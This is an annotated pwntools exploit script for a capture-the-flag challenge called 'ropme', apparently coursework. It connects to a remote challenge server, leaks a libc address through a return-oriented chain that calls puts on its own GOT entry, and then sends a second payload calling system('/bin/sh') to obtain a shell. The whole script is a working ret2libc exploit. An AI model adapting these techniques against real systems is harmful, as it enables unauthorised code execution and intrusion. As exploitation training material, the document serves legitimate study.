#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# To begin, we determine the return address is at offset 12 from the start of the
# buffer, so this is where we will place our payload to overwrite the return address.

# Since we don't have a libc leak, we have to use gadgets in the binary itself. 
# However, the binary doesn't contain enough gadgets to pop a shell. Hence, we will 
# first use these gadgets to leak a libc address, and then can return to main such 
# that we can construct another payload that utilises the libc gadgets.

# To leak a libc address, we can emulate the command puts(&puts), which will simply
# display the libc address for the puts function. To do so, we can load binary ninja
# and see the puts function in the list of symbols on the left hand side. Then, we
# can see the address of puts is 0x80483b0. This function then simply jumps to the
# GOT entry for puts, which if we navigate to in binary ninja it shows the address is
# 0x804a014. 

# Finally, if we want to return to main after leaking this address such that the
# program restarts, we need the address of main, which looking in binary ninja is
# 0x8048539. NOTE: Rather than looking in binary ninja, we can also access these
# addresses for puts and main functions using the elf command in pwntools, like this:
# elf = ELF("challenges/./ropme")
# putsAddress = elf.symbols['puts']
# mainAddress = elf.symbols['main']

# Now that we have leaked the libc address of puts, we can determine the libc base,
# which is simply the leak minus the libc offset for puts. We find the libc offset for
# puts with the command readelf -s challenges/libc-2.23.so | grep ' puts', which gives
# is 0005fca0.

# Given this, we now have access to all the gadgets in libc, and can use any gadgets
# within libc to pop a shell. Whilst in roproprop I created a ROP chain that emulated
# the command execve('/bin/sh', NULL, NULL), in this challenge I will emulate the
# command system('/bin/sh'). To do so, we simply need to find the offset of the
# system function in libc by doing readelf -s challenges/libc-2.23.so | grep ' system',
# and then find the offset of the string '/bin/sh' in libc by using the command
# ropper -f challenges/libc-2.23.so --string '/bin/sh', and add these offsets to the
# libc base. For the return address we can put anything as system doesn't return.

# The script:
p = remote("plsdonthaq.me", 6004)

# This payload will call the function puts, with its argument being the GOT entry
# for puts, and will return to the main function.
payload = (
    p32(0x80483b0) + # address of puts function
    p32(0x8048539) + # address of main function
    p32(0x804a014) # address of GOT entry for puts
)

# We then send this payload at offset 12, where the return address is located.
p.sendline(flat({
 12: payload
}))

# The program now prints the libc address of puts, which we extract from the first
# four bytes of output. Also since it is a byte string representing an address, we
# want to unpack it into an int.
p.recvuntil("Gimme data: \n")
libc_leak = u32(p.recvline()[:4])

# Using this leaked libc address for puts, we find the libc offset for puts and
# subtract it from the leak to get the libc base.
libc_base = libc_leak - 0x0005fca0

# Since we are executing system('/bin/sh'), we need the address of the system
# function and the address of the string '/bin/sh', adding both of these to the
# libc base.
system = libc_base + 0x0003ada0
bin_sh = libc_base + 0x0015ba0b

# Our payload then calls the function system with the argument '/bin/sh', and it
# doesn't return so we put anything in this slot.
payload = (
    p32(system) + # address of system function
    b"XXXX" + # any return address (since system doesn't return)
    p32(bin_sh) # address of string '/bin/sh'
)

# We then send this payload at the offset of the return address.
p.sendline(flat({
 12: payload
}))

# Now we should have shell access and can get the flag.
p.interactive()